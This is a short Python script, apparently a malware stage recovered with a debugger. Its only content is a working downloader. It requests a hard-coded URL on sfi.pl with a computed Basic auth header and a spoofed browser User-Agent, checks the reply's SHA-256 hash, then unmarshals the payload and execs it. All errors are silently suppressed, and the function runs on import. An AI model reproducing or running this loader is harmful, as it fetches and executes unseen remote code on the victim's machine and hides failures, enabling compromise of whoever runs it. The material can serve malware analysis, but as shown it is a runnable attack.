import urllib.request
import base64
import hashlib
import marshal
import types

p = b"MLeI3oxxoUodvwQ0"
dd = "ab280cf138a9391afaeeadfccc3cdc0c7ceffa9c02ebc4483c03050ffd5808ee"

# Arguments were taken from the previous code - extracted from the debugger
def f(u='https://sfi.pl/K7ucggsTz7V81QEH', c=1955):
    try:
        a = 10547116428367238450560 // c
        b = 3280413493030 // c
        r = urllib.request.Request(u)
        r.add_header("Authorization", "Basic " + base64.b64encode(p + b":" + str((a*b) % (c**4)).encode()).decode("utf-8"))
        r.add_header("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0")
        c = urllib.request.urlopen(r).read()
        d = hashlib.sha256(c).hexdigest()
        if d == dd:
            m = types.ModuleType("m")
            code = marshal.loads(c[16:])
            exec(code, m.__dict__)
    except Exception as e:
        pass
f()